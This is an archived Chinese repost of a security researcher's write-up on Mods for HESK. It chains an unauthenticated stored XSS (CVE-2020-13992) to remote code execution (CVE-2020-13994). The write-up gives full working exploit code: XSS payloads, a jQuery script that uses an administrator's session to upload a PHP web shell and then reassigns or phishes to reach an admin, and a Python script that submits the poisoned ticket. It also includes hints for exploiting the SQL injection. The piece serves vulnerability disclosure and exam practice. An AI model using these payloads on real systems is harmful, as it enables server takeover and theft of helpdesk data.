---
source: "gelusus/wxvl 公众号漏洞文库"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
title: "从未经身份验证的存储型 XSS 到 RCE"
product: "Mods for HESK CVE-2020-13992/13994，13993为补充练习"
record_type: "unknown"
document_type: "技术文章（细分类待核）"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "版本范围需厂商补丁/归档核验，末尾只最新且不维护建议无确切修复号，原研究链接明确"
side_effects: "原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96%E8%BD%AF%E4%BB%B6/%E6%9D%82%E9%A1%B9/%E4%BB%8E%E6%9C%AA%E7%BB%8F%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%9A%84%E5%AD%98%E5%82%A8%E5%9E%8B%20XSS%20%E5%88%B0%20RCE.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "recorded"
source_note: "正文标注的原文链接；链接内容及权威性未在本次重新核验"
source_url: "https://loca1gh0s7.github.io/MFH-from-XSS-to-RCE-loca1gh0st-exercise/"
id: "vw-3aa157988a272ab9edc69a12"
entity_id: "ve-3aa157988a272ab9edc69a12"
schema_version: "1"
---

# 从未经身份验证的存储型 XSS 到 RCE

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：Mods for HESK CVE-2020-13992/13994，13993为补充练习
- 文献类型：技术文章（细分类待核）
- 版本、权限及部署边界：版本范围需厂商补丁/归档核验，末尾只最新且不维护建议无确切修复号，原研究链接明确
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. 漏洞属于Mods for HESK而非HESK2.8.6核心，三个CVE缺元数据，13992+13994为实述链而13993只概述练习
2. 匿名提交不等于无交互RCE，必须有可改设置的管理员查看工单或点击诱导消息，/cache还需PHP执行配置
3. Python2代码与固定本地HTTP代理需明确依赖，验证码需要真实完成不能说仅换Burp就解决
4. 简短外载脚本用自闭合script在HTML下不可靠，后续Python给显式闭合较正确，http外载受混合内容/CSP/浏览器可达性约束
5. 上传和恢复设置两个异步请求未串行化可能竞争，恢复设置不删除PHP文件，Cleanup done不是清除后门
6. 200响应成功判据作者已自认不可靠，应保留警示并用实际文件/执行验证而非断言
7. 所有路径以站点根/admin硬编码与示例/hesk部署不一致
8. 版本范围需厂商补丁/归档核验，末尾只最新且不维护建议无确切修复号，原研究链接明确

### 操作风险

原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原文标注出处：<https://loca1gh0s7.github.io/MFH-from-XSS-to-RCE-loca1gh0st-exercise/>

### 归档技术正文

 Ots安全   2024-05-18 13:24  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn7gtxSFZlfuCW6AdQib8Q1onbR0U2h9icP1eRO6wH0AcyJmqZ7USD0uOYncCYIH7ZEE8IicAOPxyb9IA/640?wx_fmt=gif "")  
  
发现的漏洞导致 HESK (MFH)版本 2019.1.0 和低至版本 3.1.0 （2017 年 6 月 28 日）的Mods 出现三个不同的 CVE  
- CVE-2020-13992 :: 多个存储的 XSS 问题允许未经身份验证的远程攻击者滥用帮助台用户的登录会话  
  
- CVE-2020-13993 :: 多个 SQL 盲注问题允许未经身份验证的远程攻击者通过提交票证从数据库检索信息  
  
- CVE-2020-13994 :: 由于对上传资源的访问控制不当，特权用户可以在服务器上实现代码执行。这可能可以与 CVE-2020-13992 结合利用  
  
CVE-2020-13992 和 CVE-2020-13994 可以链接在一起，正如您将在本文中看到的那样。  
  
**RCE路径：**  
  
我分享此内容相信它可以作为高级 Web 攻击和利用(AWAE)课程和攻击性安全 Web 专家(OSWE)考试的一些额外“材料”。我发现 AWAE 课程中的应用程序有很多相似之处，因此相信这将是考试准备的一个很好的补充。如果您想充分利用此功能，我建议您自行下载并安装 HESK (MFH) 2019.1.0 的 Mod，并推迟阅读本博文。剧透警告：我详细介绍了 XSS (CVE-2020-13992)到 RCE (CVE-2020-13994) ，但我将 SQL 注入(CVE-2020-13993)作为练习  
  
在某个时间点（2020 年 5 月/6 月），我研究了 PHP 帮助台软件 HESK 2.8.6 （开源）的安装，并安装了“Mods for HESK 2019.1.0” （当时的最新版本）。开源对于安全研究人员和黑客来说都是很棒的。因此，我下载了 HESK2 的最新版本（2.8.6），并开始对接受用户输入的部分进行代码审查。几个小时后，这并没有暴露出任何漏洞（至少在我看来）。我有一种“这里什么都没有”的感觉。我心想我不会在 mod 软件中找到任何东西，完全忘记了开源世界中的 mod 是多么强大。他们可以轻松修改软件的核心部分。  
  
我下载了 HESK 2019.1.0 的 Mod 并进入安装目录。与 HESK 软件一样，除非您在安装后删除安装目录，否则它也会拒绝运行，我认为这是很好的做法。我登录到管理区域环顾四周 - 进行“游览”。这始终是一个很好的开始方式 - 熟悉您正在测试或代码审查的应用程序。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA6uvABRq8DOavWpWqlXsq7mQ171MmQTeaTbLKX5f8zdlkwZ4Wr6eibOEA/640?wx_fmt=png&from=appmsg "")  
  
这就是打开安装了 MFH 的 hesk 时的样子。好吧，除了电子邮件字段中的“hello@loco” （是的，我懒得再次编辑屏幕截图，抱歉）。在了解该应用程序时，我使用安装时创建的管理员用户登录。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA6p1G8X68s7ZrcloJK4yCul32bDuFe9NXz9yweeqyOic5yuxpq54IJgQA/640?wx_fmt=png&from=appmsg "")  
  
登录后，很快就找到了设置页面。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA6lLPwc5ich8iab6HPU2mhVffxYyVlUk13juZG1Lic2YHMaytuvbKSB9pNg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA6zHjeRbHmHickkkf4Jc4OXn46ibDwticEjfvX5GP9LFdyC4CTAY1iaatUog/640?wx_fmt=png&from=appmsg "")  
  
在探索应用程序的登录部分时，我注意到默认情况下启用上传附件的可能性。在设置中，我发现允许上传的文件扩展名是可配置的。这太有趣了。我还在帮助台部分发现了一个“show useragent”选项（默认情况下未启用）。嗯。此外，MFH 插件还有 UI 颜色部分 - 支持图像上传！我想要一种方法，所以我一直在查看用户输入，尤其是匿名用户可以提交带有文件上传的票证的情况。Burp 已经启用并且愿意，所以我退出了管理区域并提交了一张票：（暂时忽略文件上传）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA694VGpmAuvU6xCvEHCEZIIYDGRtdk2eNtsSggBDafAQWstjXsXo3rfg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA6lYBy49vibqB4UEYJs6A5Oo5bBEz7G4BanLZMSic4ia6uv2fEs4UtZwyjw/640?wx_fmt=png&from=appmsg "")  
  
我注意到原始 HESK 中没有 4 个字段。这太有趣了。计算  
screen_resolution_height和  
screen_resolution_width不会让我有任何进展，因为它们是我关注的纯整数  
latitude和  
longitude。尽管我现在对 HESK 软件源有些熟悉，但我发现通过 Burp 测试 XSS 有效负载并检查我期望显示/使用这些值的页面源会更快、更令人兴奋。  
```
<script>alert('latitude')</script>
<script>alert('longitude')</script>
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA64bwEQhPmBWsBh4686xwfRuDC2x8LEMFUsblibrpIdO62lBaf63wGB2A/640?wx_fmt=png&from=appmsg "")  
  
这就是我所做的，我使用“标准基本”XSS 有效负载注入经度和纬度。我发货后回复说：您的票已成功提交！票证 ID：Q95-JAY-H8LZ。到目前为止一切顺利，现在我将登录帮助台并查看票证。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA6E7bicl3USuhgBrjhQkib8DFF76IyUALzl65icWGpvuPG2DQC9xtJzgnpg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA6XK9Oylicoj9qVGRXmfvVRrPouAIQjlbmtK8AAmTACibgBBAcmeArklEQ/640?wx_fmt=png&from=appmsg "")  
  
每当我看到这个的时候，我的胃总是一阵刺痛。好吧，经度是可以注入的，但为什么纬度有效载荷没有发射呢？检查页面源代码发现我们实际上直接进入 JavaScript 并且不需要脚本标签。脚本标签实际上破坏了纬度注入和经度之后的 JavaScript 其余部分。这也是 devtools 和 console 告诉我们的：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA610Zd8dyI3IZpk7Y5GY3ibsNUWqdq5Mbym7S3nk4Mf4LnZzBWOIiaPgFA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA6nYYlGCYPMdTF8iaKqr3zlys1SUzfEsbpAXbSmVEbibkfhxTN3Sfn87Cg/640?wx_fmt=png&from=appmsg "")  
  
让我们通过将有效负载更改为来修复它：  
```
1;alert('stored XSS are the best!')
1;alert('but how much space is available?')
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA6QOrvwSvMibicOn3bibzL9W9icib82ceK4eMZCUTlf3zAHniaLgwZHdvmvYaQ/640?wx_fmt=png&from=appmsg "")  
  
我撕掉所有饼干（以避免  
$_SESSION['already_submitted']凝固）并运送它！我又得到一张票 Q2U-JDN-YXDU！单击管理面板中的票证...  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA6F6MVLjDZyWmuia05N2Vk4VgUhF9GYBbVvMiar5KbeXX9tP8EkZWeOIuA/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA6UI9orYXYw7mROAV7YAtoPOJBlL2z5sKTckXYdwV6nSRwa4aszqdsDg/640?wx_fmt=png&from=appmsg "")  
  
完美的！它完美地融合在一起。  
  
是的，是的，我知道你在想什么，我们可以窃取会话 cookie 吗？不，至少在最新版本的 MFH 中不是这样。所以，我们能做些什么？  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA66fXyvnEUKMzguJz97dofEWpmEe6KyukCHNNWn0dl4VSE9465CC4Npg/640?wx_fmt=png&from=appmsg "")  
  
在我之前对 HESK 的研究中，我注意到上传附件功能。作为管理员，您可以更改附件上传允许的扩展名。黑客耳中的音乐！制作 XSS 来更改设置以允许 php 文件上传，提交带有附件的票证，并在票证中使用 XSS 来确定文件名 - 然后继续执行，我们就有了 RCE！在输入攻击脚本之前，请务必手动测试您的思路。我做到了，我很高兴。因为源代码中潜藏着一些非常好的东西：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA6yo2x3aIkw2ZplgkcMOgktmzw4zoDictPaEHn0AtEvIniaw77UzG8icSiaw/640?wx_fmt=png&from=appmsg "")  
  
没有适合您的 PHP 扩展！好吧，如果网络服务器执行 php2、php6 或 php7，那么您很幸运 - 但这是我们无法进行攻击的条件。还记得 MFH UI 插件中的上传图片功能吗？我快速转到设置页面的底部并上传登录框标题图像的文件。我选择了一个可爱的小 PHP 文件：  
```
<?php echo "Stored XSS is sexy but I really <3 RCE"; ?>
```  
  
同样，我可以阅读源代码来确定这个向量是否可能，但我认为仅使用应用程序函数来测试这个方向的第一步会快得多，如果不成功，我们将深入研究源代码。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA65O8fGnyOw9l7H918ZLw1KGJqkesVW1odt3ibY86mU5kjG2XdtAkZTOA/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA6QoS2FUp4ibrTU591TwX8iaFvX5NlqT609sYRbP0spKEA0xJCRia9EX8iaQ/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA6eicP5niczkfb1ftjbcM1KlVGCeCD3e36WkKiarW3L5Nns5pLY6JHGmDeg/640?wx_fmt=png&from=appmsg "")  
  
正如您所看到的，没有什么可以阻止我在这里上传 PHP 文件。导航到登录屏幕，我找到了图片，或者至少是它的占位符。“src”属性显示了放入 /cache 文件夹中的“后门”。在另一个选项卡中打开它可以为我们提供每个黑客都想要的东西，即在网络服务器上执行代码。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA6LrFmDstAib6IGANmibIz33EzJOLvmre3v027ek3WLP3ceMHlRxXOODDw/640?wx_fmt=png&from=appmsg "")  
  
现在我们知道我们想要什么，但是我们如何实现它，我们可以将整个 JavaScript 负载放入数据库吗？我们遇到了 hesk 数据库：  
mysql -u root然后  
use hesk;。  
describe hesk_tickets;这表明我们在经度和纬度各有 100 个角色可以玩。好吧，我们可能可以摆脱这个（嘘！用户代理标头也容易受到 XSS 的攻击 - 并且它在数据库中的类型是 TEXT！），但我没有时间对代码进行微优化，尽管我真的很喜欢它。我们还可以在任一可见票证字段中对一些有效负载数据进行 Base64 编码，但这不会很隐蔽......  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA6JJPAJia1OvmAyAicKXNlo0Xga784AjvIeHGFMsZ1t2xnxwVIrNy7ta0g/640?wx_fmt=png&from=appmsg "")  
  
改天我们将跨越 CSP 旁路（例如通过利用附件 :D）桥，现在我将解决加载外部脚本的问题。有一千种方法可以做到这一点，但我选择了（localhost在这里工作，因为我正在攻击本地安装的web应用程序）：  
```
1;</script><script src='http://localhost/js/evil.js'/><script>//
```  
  
不喜欢开发工具控制台窗口中带有文本的红线，我在末尾添加注释以注释掉不受我们控制的分号。  
  
现在 jQuery 已经存在，这将使一些事情变得更容易（至少对我来说）。在等待 DOM 加载的 IIFE （立即调用函数表达式）中制作有效负载：  
```
(function(){
  $(document).ready(function () {
    $.get( "/admin/admin_settings.php", function(htmldata) {
      var f = $('form[name="form1"]', $(htmldata));
      // We will try to upload RCE payload
      var fd = new FormData(f[0]);
      fd.set('login-box-header', 'image');
      var blob = new Blob(["<?php echo shell_exec('id'); ?>"], {
        type: 'application/x-php'
      });
      fd.set('login-box-header-image', blob, 'whateverdontmatter.php'); /* Check it out: https://www.youtube.com/watch?v=w8QH93jWZbk */
      $.ajax({
        url: $(f).attr('action'),
        data: fd,
        processData: false,
        contentType: false,
        type: 'POST',
        success: function(data){
          // This is incorrect, page returns 200 either way and I am also being lazy with the printout of the backdoor, but this is just a PoC :D
          console.log("Seems we were successful, check the door: http://localhost/cache/lbh_login-box-header-image.php");
        }
      });
      // Remember to reset login-box-header to helpdesk-title and save settings again
      var reset = new FormData(f[0]);
      $.ajax({
        url: $(f).attr('action'),
        data: reset,
        processData: false,
        contentType: false,
        type: 'POST',
        success: function(data){
          console.log("Cleanup done...");
        }
      });
    }
  });
})()
```  
  
我注意到如果我改回设置，PHP 文件不会被删除。正如您在上面的脚本中看到的那样，我们提供了隐身功能，我们接受了它。就这样，我们发现了一个秘密的 gh0st 漏洞，导致目标网络服务器上出现 RCE！好吧，这假设这张邪恶的票据落在帮助台系统的管理员用户身上。我们都知道到底是谁的母亲假设。那么让我们对此进行改进。  
  
想象一下，票证被自动分配给有限的用户。如果是这种情况，我们可以将其重新分配给管理员用户：D。进一步研究表明，向其他用户发送消息的页面实际上似乎列出了 HESK 管理区域的所有注册用户。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA6j0YuvJoWkMUiaWVz5zxCwWTdeJG44alYEticADGEicQw50PicXo81MuRdQ/640?wx_fmt=png&from=appmsg "")  
  
这很有帮助，而且 - 用户 ID 也被公开了。除非有人严重搞乱了 HESK 的安装，否则 userid 1 将始终是管理员用户。它无法删除或降级。  
  
在这些领域中进一步的 XSS 似乎是不可能的，但是查看 mail.php  
$_SESSION['mail']['message'] = hesk_makeURL($_SESSION['mail']['message']);告诉我们 url 将被解释为链接。有了这些知识，我们就可以向 admin/mail.php 页面发出有效负载请求，以获取列表中数量最少的用户（0 除外），并且如果我们有足够的权限，则可以将票证重新分配给管理员用户，否则进行网络钓鱼管理员用户有一条有趣的消息链接到我们的中毒票证：D。  
```
(function(){
  $(document).ready(function () {
    var token = 0;
    var ticket = "";
    var sendIt = function(url, postdata) { 
      $.post(url,postdata);
      return "hey";
    };
    var parseAdmin = function(htmldata) {
      var f = $('form[name="form2"]', $(htmldata));
        var u = $(f[0][1]);
      var a = [];
      $(u[0]).find('option').each(function(i,v) {
        if(v.value != 0) { a[v.value] = v.text }  
      });
      if (a[1] != null) {
        return 1; 
      } else {
        // We assume that next user that was created after admin has privs...
        for (uu in a) {
          if(a.hasOwnProperty(uu)) {
            return uu;
          }
        } 
      }
    };
    var getMailInfo = function() {
      return $.when($.get('/admin/mail.php'));
    };
    var reAssignPayload = function(reAssignTo) {
      data = {
        "owner": reAssignTo,
        "track": ticket,
        "token": token
      };
      sendIt('/admin/assign_owner.php', data);
    }
    var sendMessage = function(token, recipient) {
      var data = {
        "to": recipient, 
        "subject":"I need your input on this ticket",
        "message":"Please read the log for ticket: " + window.location.href + "\n\nWhat do you think?\nThanks.",
        "signature":1,
        "token":token,
        "a":"send"};
      sendIt("/admin/mail.php", data)
    };
    var passThePayload = function() {   
      getMailInfo().then(function(data) {
        console.log("Passing payload to someone important...");
        var adminOrnextBestThing = parseAdmin(data);
        if ($('#changeOwnerForm').html()) {
          // We can assign someone, go for it
          console.log("We are allowed to reassign, attempting reassign to admin...");
          reAssignPayload(adminOrnextBestThing);
        }
        else {
          // Best we can do is send a phishing message with link to payload
          console.log("Reassign denied, we'll go phishing admin with message...");
          sendMessage(token, adminOrnextBestThing);
        }
      });
    };
    ticket = $('#changePriorityForm input[name="track"]').val();
    token = $('#changePriorityForm input[name="token"]').val();
    // testing if we can reach settings
    $.get( "/admin/admin_settings.php", function(htmldata) {
    var f = $('form[name="form1"]', $(htmldata));
    if(!f[0]) {
      passThePayload();
    }
    else {
      // We get the page, can we submit settings??
      $.ajax({
        url: $(f).attr('action'),
        type: 'POST',
        data : $(f).serialize(),
        success: function(response){
        var error = $('div.alert.alert-danger', $(response));
        if(error[0]) {
          // There are errors
          console.log('There are errors...');
          $(error).each(function(i,v) {
            var er = $(v).find('a')[0];
            if($(er).attr('href') == "index.php") {
              console.log('No access to save settings...');
              passThePayload();
            }
          });
        }
        else {
          console.log("Seems we have access to save settings, building backdoor...");
          // We will try to upload RCE payload
          var fd = new FormData(f[0]);
          fd.set('login-box-header', 'image');
          var blob = new Blob(["<?php echo shell_exec('id'); ?>"], {
            type: 'application/x-php'
          });
          fd.set('login-box-header-image', blob, 'whateverSTILLdontmatter.php'); /* Check it out: https://www.youtube.com/watch?v=w8QH93jWZbk */
          $.ajax({
            url: $(f).attr('action'),
            data: fd,
            processData: false,
            contentType: false,
            type: 'POST',
            success: function(data){
              console.log("Seems we were successful, check the door: http://localhost/cache/lbh_login-box-header-image.php");
            }
          });
          // Remember to reset login-box-header to helpdesk-title and save settings again
          var reset = new FormData(f[0]);
          $.ajax({
            url: $(f).attr('action'),
            data: reset,
            processData: false,
            contentType: false,
            type: 'POST',
            success: function(data){
              console.log("Cleanup done...");
            }
          });
        }
      }});
    }
  });
}); 
})()
```  
  
现在好多了（除了我的编码技能：D）。让我们用一个利用 XSS 漏洞的 python 脚本来补充这个有效负载：  
```
#!/usr/bin/python
import sys
import requests

def submitEvilTicket(target, payloadlocation):
  proxies = {'http': 'http://127.0.0.1:8080'} # Debug
  target = "%s/submit_ticket.php?submit=1" % target
  data = {
    'name': 'loca1gh0st',
    'email': 'loca1gh0st@localhost',
    'priority': '3',
    'subject': 'You have a gh0st in the shell very soon',
    'message': 'Duh-duh, duh duh. Who you gonna call? (loca1)gh0st busters!',
    'latitude': '1;</script><script src="%s"></script><script>//' % payloadlocation, # Stored XSS up to 100 chars
    'longitude': '1', # Stored XSS here to up to 100 chars
    'screen_resolution_height': 123, # SQL injection here, not used in this exploit
    'screen_resolution_width': 123, # SQL injection here, not used in this exploit
    'token': 'whatever',
    'category': '1',
    'hx': '3',
    'hy': ''
  }

  r = requests.post(target, data=data, proxies=proxies)

  res = r.text
  if "ticket.php?track=" in res:
    print "Ticket submitted, now a user would need to view the ticket:\n"
    # If you like you could bs, grep or regex for the Ticket ID, but that's on you
    return True
  return False

def main():
  if len(sys.argv) != 3:
    print "(+) usage: %s <targetandpath> <payloadtarget>" % sys.argv[0]
    print "(+) eg: %s https://192.168.121.103/hesk http://10.10.10.123/gh0st-inject.js" % sys.argv[0]
    sys.argv[0]
    sys.exit(-1)

  target = sys.argv[1];
  payload = sys.argv[2];

  if submitEvilTicket(target, payload):
    print "(+) We successfully sent a gh0st in the envelope"
    print "(+) if target is between version -2019.1.0- and -June 28 2017 Version 3.1.0-"
    print "(+) you should expect great success"

  else:
    print "(-) That failed, check your target path and if they have enabled captcha or equivalent!"
    print "(-) If there is captcha involved do this step through you favorite proxy which is Burp!"
if __name__ == "__main__":
  main()

```  
  
那么它最终是什么样子呢？  
  
我们运行脚本  
```
python ticketXXs.py http://localhost/ http://localhost/js/evil.js
```  
  
这是一个用户非常有限的示例，甚至无法重新分配票证：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA6AO6fuA0xFXc2u8KZmwTibmAzFfR9yNfYzGm2BmPAruM6rbqzeNDVwPA/640?wx_fmt=png&from=appmsg "")  
  
受限用户打开新分配的票证，执行 JavaScript - 无法分配管理员，因此自动选择网络钓鱼选项：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA6UWib7Ogm7kxXj8sriaia9MZe8wnCpZ1fWH4iaQpovPPGJJ7P8XdVrEj5Ug/640?wx_fmt=png&from=appmsg "")  
  
管理员用户有一条新消息：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA6jYJJrKWU2w6oEjwhiacVYL28IWvFnRMhNdKAf8e1jcj1TQicdPMf2eHw/640?wx_fmt=png&from=appmsg "")  
  
管理员用户单击受感染票证的链接：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA67tKOkOltlCVKiamFrOXLN6L9M9GXnY5oQ3ibcmb4AMKrrdUiaZKz1bECw/640?wx_fmt=png&from=appmsg "")  
  
  
管理员有上传UI图片的权限，pwned：  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA6vV5MB5icEsVY6839C38VkS1PIkINppXyXibKHNKwNWvbN5D0jZG5ARhA/640?wx_fmt=png&from=appmsg "")  
  
远程代码执行：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA6Zw5VlNJGQQNy3AxF4r2wxFicQBxmyyftPBiblHjnIFiaCLnTA0f63wZXw/640?wx_fmt=png&from=appmsg "")  
  
请注意，如果目标启用了某种验证码（默认情况下未启用），则此操作将不起作用。但这只是您在需要时通过 Burp 发送的一个请求。最后，还记得submit_ticket.php中的screen_resolution_heightand吗？screen_resolution_width嗯，它们实际上都容易受到 SQL 注入攻击。我们不需要这个漏洞来绕过这里的身份验证。此攻击应该适用于 -2019.1.0- 和 -2017 年 6 月 28 日版本 3.1.0- 之间的 HESK 版本 Mod，因为这些版本容易受到 SQL 注入、XSS 和 RCE 的攻击。  
  
如果 RCE 不适用怎么办？例如，在 3.1.0 以下的版本中，没有 UI 图像上传功能。好吧，我们仍然可以通过会话骑行绕过身份验证。但是如果我们需要以管理员用户身份登录怎么办？这里 SQL 注入向量变得有趣。我将其作为 AWAE 学生（当然还有其他任何人）的练习，利用 SQL 注入将管理员密码哈希添加到票证中，并利用 XSS 窃取数据，为管理员用户构建自动登录令牌。一些提示：  
- 请记住，默认情况下未启用“show useragent”  
  
- 针对邪恶者的基于条件的休息（SLEEP(X) 会起作用，但这将是一大堆罚单 - 糟糕的帮助台 - 如果启用了验证码，你也很糟糕。如果你没有 XSS，仍然是一个有效的选择）  
  
- SQL 注入需要生成带符号的 INT 类型。  
  
- 您需要提交至少 6 个（如果我错了，请纠正我）用户名和密码哈希的邪恶票证，并收集至少一个票证 ID  
  
- SQL 是非常非常盲目的。您应该利用 XSS 来窃取数据  
  
最后，我想说这些漏洞很严重，因为攻击者可以窃取每张提交的票证上的所有数据，并以附件形式进一步使用恶意负载回复这些票证。这些漏洞很快被报告给了软件作者，软件作者也迅速而专业地做出了回应。我强烈建议该软件的用户更新到最新版本的 MFH - Mods for HESK，如果可能的话，转换到原始 HESK，因为 MFH 不再维护。  
  
```
原文地址：
https://loca1gh0s7.github.io/MFH-from-XSS-to-RCE-loca1gh0st-exercise/
```  
  
  
  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif "")  
  
**点它，分享点赞在看都在这里**  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
